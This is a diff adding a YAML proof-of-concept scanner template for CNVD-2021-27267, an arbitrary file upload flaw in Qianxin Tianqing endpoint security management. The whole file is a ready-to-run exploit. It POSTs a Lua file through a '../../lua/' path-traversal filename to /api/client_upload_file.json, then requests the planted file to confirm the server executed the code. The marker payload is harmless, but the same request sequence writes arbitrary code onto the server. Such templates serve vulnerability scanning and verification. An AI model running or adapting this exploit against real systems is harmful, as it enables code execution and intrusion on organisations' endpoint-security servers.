@@ -1,0 +1,32 @@
+id: poc-yaml-qianxin-terminal-security-management-system-client-upload-file-json-anyfile-upload
+info:
+  name: 奇安信天擎终端安全管理系统 client_upload_file.json 任意文件上传漏洞(CNVD-2021-27267)
+  severity: critical
+  tags:
+  - CNVD-2021-27267
+  - 两高一弱
+  finger: 天擎终端安全管理系统
+variables:
+  t1: random_str(4)
+  t2: random_str(20)
+requests:
+- method: POST
+  path: /api/client_upload_file.json?mid=12345678901234567890123456789012&md5=12345678901234567890123456789012&filename=../../lua/{{.t1}}.LUAC
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLx7ATxHThfk91oxQ
+  data: '------WebKitFormBoundaryLx7ATxHThfk91oxQ
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.jpg"
+
+    Content-Type: image/jpeg
+
+
+    ngx.print(''{{.t2}}'')
+
+    ------WebKitFormBoundaryLx7ATxHThfk91oxQ--'
+  expression: status_code == 200 && contains(body,"upload_file_md5")
+- method: GET
+  path: /api/{{.t1}}.json
+  expression: status_code == 200 && ( contains(headers,"server\x3a QiAnXin web server")
+    || contains(headers,"server\x3a 360 web server") )
+transport: http
